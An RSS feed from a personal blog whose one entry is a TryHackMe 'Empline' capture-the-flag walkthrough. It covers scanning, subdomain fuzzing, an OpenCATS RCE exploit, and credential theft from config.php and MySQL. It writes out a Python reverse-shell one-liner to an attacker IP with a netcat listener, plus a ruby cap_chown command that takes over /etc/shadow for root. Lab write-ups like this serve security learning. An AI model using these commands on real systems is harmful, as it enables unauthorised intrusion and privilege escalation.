<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Sinameki&apos;Sarp&apos;s Playground</title>
    <description>Sinameki Sarp&apos;s CTF Writeups and blogposts...</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Thu, 24 Nov 2022 12:18:23 +0300</pubDate>
    <lastBuildDate>Thu, 24 Nov 2022 12:18:23 +0300</lastBuildDate>
    <generator>Jekyll v4.3.1</generator>
    
      <item>
        <title>TryHackMe: Empline CTF Writeup</title>
        <description>&lt;p&gt;TryHackMe medium level web machine Empline boot2root walkthrough.&lt;/p&gt;
&lt;h2 id=&quot;discovery-part&quot;&gt;Discovery Part&lt;/h2&gt;

&lt;p&gt;First thing I scan all ports what services are running on the server.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.10.70.209
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/1.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Server has a &lt;strong&gt;web service&lt;/strong&gt;, &lt;strong&gt;ssh&lt;/strong&gt; service and &lt;strong&gt;mysql&lt;/strong&gt; database. Then I go to webpage.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/2.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing is there… so I wonder is there any subdomain. First assigned ip to empline.thm in &lt;strong&gt;“/etc/hosts”&lt;/strong&gt; document. Then I use &lt;strong&gt;wfuzz&lt;/strong&gt; for find subdomains.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host:FUZZ.empline.thm&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://empline.thm/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/SecList
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/Untitled.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So there is one subdomain “&lt;strong&gt;job.empline.thm&lt;/strong&gt;”. I look what is in there and I find login page&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/3.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and also “&lt;strong&gt;opencats”&lt;/strong&gt; is running on the system. I checked source code any information about “&lt;strong&gt;opencats version&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/4.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So I know version number and I search any exploit for “&lt;strong&gt;opencats 0.9.4&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/5.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration-part&quot;&gt;Enumeration Part&lt;/h2&gt;

&lt;p&gt;Perfect!! There is a “&lt;strong&gt;RCE(Remote Code Execution)”&lt;/strong&gt; exploit suitable for the machine. I get the exploit from searchsploit and run…..&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/6.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is working!!! But something is wrong. Yes I can run the commands but its not like real shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/7.png&quot; alt=&quot;7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is not exactly shell but we can get shell easily from command execution. Server has python3 so I can run python code. I made reverse shell payload with python.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.8.8.50&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&apos;&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I run the python code on target machine and In my machine I use netcat for listen port.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;nc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lvnp&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/8.png&quot; alt=&quot;8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I got the shell… I checked is there any config files for &lt;strong&gt;“opencats”&lt;/strong&gt;. I went to “&lt;strong&gt;/var/www/html/opencats&lt;/strong&gt;” folder. Let’s look files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/9.png&quot; alt=&quot;9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;“config.php”&lt;/strong&gt; file can contains important data. I read the file with cat command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/10.png&quot; alt=&quot;10.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I can login mysql database with this information. Let’s try…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/11.png&quot; alt=&quot;11.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I succesfully loged in with credentials. I found databases. Let’s continue with opencats.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/Untitled%201.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;“&lt;strong&gt;user&lt;/strong&gt;” table looks interesting.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/12.png&quot; alt=&quot;12.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There are encrypted passwords. I check “&lt;strong&gt;crackstation.net&lt;/strong&gt;”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/13.png&quot; alt=&quot;13.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I know the password but I need user’s name for ssh. I looked users on the machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/Untitled%202.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Try login ssh with username and password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/14.png&quot; alt=&quot;14.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation-part&quot;&gt;Privilege Escalation Part&lt;/h2&gt;

&lt;p&gt;Find and read user flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/15.png&quot; alt=&quot;15.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Last thing I need to become root for successfully finish the machine. I upload “&lt;strong&gt;linpeas.sh”&lt;/strong&gt; tool for find any information become root.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/16.png&quot; alt=&quot;16.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Linpeas&lt;/strong&gt; shows there are some capabilities user can. “&lt;strong&gt;/usr/local/bin/ruby = cap_chown+ep&lt;/strong&gt;” means user can change any file’s owner with ruby. I change “&lt;strong&gt;/etc/shadow&lt;/strong&gt;” file’s owner because if user write the shadow file then can change the root’s password.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;ruby&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;require &quot;fileutils&quot;; FileUtils.chown &quot;george&quot;, &quot;george&quot;, &quot;/etc/shadow&quot;&apos;&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/17.png&quot; alt=&quot;17.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I changed root’s password. Let’s try to login root.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/18.png&quot; alt=&quot;18.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;thank-you-for-reading-&quot;&gt;THANK YOU FOR READING 🙂&lt;/h3&gt;

</description>
        <pubDate>Thu, 24 Nov 2022 00:00:00 +0300</pubDate>
        <link>http://localhost:4000/TryHackMe-Empline/</link>
        <guid isPermaLink="true">http://localhost:4000/TryHackMe-Empline/</guid>
        
        <category>red</category>
        
        <category>yellow</category>
        
        
        <category>TryHackMe</category>
        
        <category>CTF</category>
        
        <category>Writeup</category>
        
      </item>
    
  </channel>
</rss>
